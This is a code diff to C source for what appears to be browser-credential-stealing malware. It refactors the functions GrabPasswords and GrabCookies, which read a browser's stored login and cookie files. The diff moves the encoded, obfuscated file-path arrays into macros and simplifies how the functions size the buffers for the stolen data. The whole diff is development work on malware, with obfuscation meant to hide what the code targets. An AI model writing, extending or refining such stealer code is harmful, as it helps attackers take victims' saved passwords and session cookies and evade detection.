@@ -5,6 +5,7 @@
 #include "../include/PathOps.h"
 #include "../include/FileIO.h"
 #include "../include/decoding.h"
+#include "../include/macros.h"
 
 
 void GrabPasswords(unsigned short *BrowserPath) {
@@ -14,7 +15,7 @@ void GrabPasswords(unsigned short *BrowserPath) {
     char                FileSizeString[20]  = {0};
     unsigned char      *buffer              = {0};
     unsigned short      TempPath[250]       = {0};
-    unsigned short      LoginDataPath[20]   = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x0078, 0x008f, 0x00b6, 0x0081, 0x00bf, 0x003d, 0x0047, 0x00a2, 0x0094, 0x00b5, 0x0000};
+    unsigned short      LoginDataPath[20]   = LOGIN_DATA;
     int                 FileSize            = 0;
     int                 FullBufferSize      = 0;
     int                 PathSize            = lenW(BrowserPath);
@@ -30,7 +31,7 @@ void GrabPasswords(unsigned short *BrowserPath) {
     }
 
     FileSize = GetFileSizeY(FileHandle);
-    FullBufferSize = TotalBufferLength(L"ONE", FileSize);
+    FullBufferSize = 386 + IntLen(FileSize) + FileSize;
     
     buffer = AllocMemory(FullBufferSize);
     if (buffer == NULL) {
@@ -49,7 +50,7 @@ void GrabCookies(unsigned short *BrowserPath) {
     char                FileSizeString[20]  = {0};
     unsigned char      *buffer              = {0};
     unsigned short      TempPath[250]       = {0};
-    unsigned short      CookiesPath[25]     = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x007a, 0x0087, 0x00b7, 0x00a8, 0x00b5, 0x009b, 0x00b4, 0x007e, 0x007d, 0x0078, 0x00d5, 0x0074, 0x00cb, 0x006c, 0x00d1, 0x0000};
+    unsigned short      CookiesPath[25]     = COOKIES;
     int                 FileSize            = 0;
     int                 FullBufferSize      = 0;
     int                 PathSize            = lenW(BrowserPath);
@@ -65,7 +66,8 @@ void GrabCookies(unsigned short *BrowserPath) {
     }
 
     FileSize = GetFileSizeY(FileHandle);
-    FullBufferSize = TotalBufferLength(L"TWO", FileSize);
+
+    FullBufferSize = 386 + IntLen(FileSize) + FileSize;
 
     buffer = AllocMemory((SIZE_T)FullBufferSize);
     if (buffer == NULL) {
